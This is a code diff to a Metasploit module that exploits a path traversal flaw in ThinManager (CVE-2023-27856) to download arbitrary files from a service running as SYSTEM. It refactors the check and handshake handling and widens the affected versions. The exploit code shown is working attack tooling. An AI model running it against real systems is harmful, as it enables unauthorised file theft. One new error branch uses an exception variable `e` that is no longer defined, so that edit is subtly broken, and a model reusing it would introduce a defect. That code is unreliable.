@@ -7,7 +7,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   prepend Msf::Exploit::Remote::AutoCheck
-  CheckCode = Exploit::CheckCode
 
   def initialize(info = {})
     super(
@@ -15,7 +14,7 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'ThinManager Path Traversal (CVE-2023-27856) Arbitrary File Download',
         'Description' => %q{
-          This module exploits a path traversal vulnerability (CVE-2023-27856) in ThinManager <= v12.1.5 to retrieve arbitrary files from the system.
+          This module exploits a path traversal vulnerability (CVE-2023-27856) in ThinManager <= v13.0.1 to retrieve arbitrary files from the system.
 
           The affected service listens by default on TCP port 2031 and runs in the context of NT AUTHORITY\SYSTEM.
         },
@@ -53,8 +52,9 @@ class MetasploitModule < Msf::Auxiliary
   def check
     begin
       connect
-    rescue Rex::ConnectionTimeout => e
-      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed: #{e.message}")
+    rescue Rex::ConnectionTimeout
+      print_error("Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed.")
+      return CheckCode::Unreachable
     end
 
     vprint_status('Sending handshake...')
@@ -65,11 +65,11 @@ class MetasploitModule < Msf::Auxiliary
     res = sock.get_once(4096, 5)
     expected_header = "\x00\x04\x00\x01\x00\x00\x00\x08".b
 
-    if res && res.start_with?(expected_header)
+    if res&.start_with?(expected_header)
       vprint_status('Received handshake response.')
       vprint_status(Rex::Text.to_hex_dump(res))
       disconnect
-      return CheckCode::Detected
+      return Exploit::CheckCode::Detected
     elsif res
       vprint_status('Received unexpected handshake response:')
       vprint_status(Rex::Text.to_hex_dump(res))
@@ -77,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Safe
     else
       disconnect
-      returnExploit::CheckCode::Unknown('No handshake response received.')
+      return Exploit::CheckCode::Unknown('No handshake response received.')
     end
   end
 
@@ -105,16 +105,13 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, "Failed during handshake send: #{e.class} - #{e.message}")
     end
 
-    begin
-      res = sock.get
-      if res
-        print_status('Received handshake response.')
-        vprint_status(Rex::Text.to_hex_dump(res))
-      else
-        print_error('No handshake response received.')
-      end
-    rescue StandardError => e
-      fail_with(Failure::TimeoutExpired, "Failed to receive handshake response: #{e.class} - #{e.message}")
+    res = sock.get
+    if res
+      print_status('Received handshake response.')
+      vprint_status(Rex::Text.to_hex_dump(res))
+    else
+      print_error('No handshake response received.')
+      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed: #{e.message}")
     end
 
     data = [0xaa].pack('N')
